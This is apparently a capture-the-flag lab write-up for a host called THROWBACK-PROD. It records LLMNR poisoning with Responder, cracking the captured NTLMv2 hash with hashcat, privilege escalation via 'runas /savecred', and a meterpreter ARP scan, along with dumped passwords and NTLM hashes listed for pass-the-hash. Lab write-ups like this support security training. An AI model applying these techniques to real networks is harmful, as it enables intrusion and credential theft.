# THROWBACK-PROD


http://10.200.24.219/phpinfo.php


Using Responder:


```
sudo ./Responder.py -I tun0 -rdw -v
```

We eventually caught a LLMNR request:

```
[SMB] NTLMv2-SSP Client   : 10.200.24.219
[SMB] NTLMv2-SSP Username : THROWBACK\PetersJ
[SMB] NTLMv2-SSP Hash     : PetersJ::THROWBACK:83d3e94160875c54:45C7B67ECB07DEE5C1E1C6214E448FB7:0101000000000000C0653150DE09D2017B430EFECF9FE1B8000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D201060004000200000008003000300000000000000000000000002000003A036FA605C83CEAF5BEA2891C0417E9E11BC5316FDB3194C736D953EDE18CB00A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00350030002E00320032002E0035000000000000000000
```

We were able to crack this with Colabcat (online Hashcat through Google Cloud/Google Colab)

```
hashcat -m 5600 -r OneRuleToRuleThemAll.rule  hashes.txt rockyou.txt 
```

We uncovered the password:


```
Throwback317
```


After getting access, we were able to run `Seatbelt.exe` and discover that there were some saved credentials.

**NOTE:  We needed to run `Seatbelt.exe` through a RDP session (download the binary and execute it from a real desktop GUI) because for some reason the Credentials Manager in Windows just didn't want to act without a live interactive session**

We were able to run:

```
runas /savecred /user:admin-peters /profile "cmd.exe"
```

And this spawned a local administrative command-line.

From there, we could the `root.txt` password in
`C:/Users/Administrator/Desktop`

```
TBH{4d6945c0b80283b875fc7c3a5a057da6}
```


admin-petersj password: 

```
SinonFTW123!
```

BlaireJ cleartext:

```
7eQgx6YzxgG3vC45t5k9
```

BlaireJ hash:

```
c374ecb7c2ccac1df3a82bce4f80bb5b
```


Administrator NTLM hash:

```
a06e58d15a2585235d18598788b8147a
```

PTH:

```
PetersJ:b81e7daf21f66ff3b8f7c59f3b88f9b6
BlaireJ:c374ecb7c2ccac1df3a82bce4f80bb5b
Administrator:a06e58d15a2585235d18598788b8147a
```

---------------------

With meterpreter `arp_scanner` we found other internal IP addresses:

```
[+] 	IP: 10.200.24.1 MAC 02:aa:9e:7e:cb:d3 (UNKNOWN)
[+] 	IP: 10.200.24.79 MAC 02:d7:0f:78:28:2f (UNKNOWN)
[+] 	IP: 10.200.24.117 MAC 02:7e:16:63:90:a7 (UNKNOWN)
[+] 	IP: 10.200.24.118 MAC 02:a4:5a:e2:7f:25 (UNKNOWN)
[+] 	IP: 10.200.24.138 MAC 02:0d:a7:61:be:67 (UNKNOWN)
[+] 	IP: 10.200.24.176 MAC 02:7a:8d:60:6c:9f (UNKNOWN)
[+] 	IP: 10.200.24.183 MAC 02:ee:d0:2b:ef:37 (UNKNOWN)
[+] 	IP: 10.200.24.219 MAC 02:3d:82:6f:a1:21 (UNKNOWN)
[+] 	IP: 10.200.24.222 MAC 02:c9:0e:f3:8b:7f (UNKNOWN)
[+] 	IP: 10.200.24.232 MAC 02:34:ef:09:72:8d (UNKNOWN)
[+] 	IP: 10.200.24.243 MAC 02:03:e3:98:81:ed (UNKNOWN)
[+] 	IP: 10.200.24.255 MAC 02:3d:82:6f:a1:21 (UNKNOWN)
```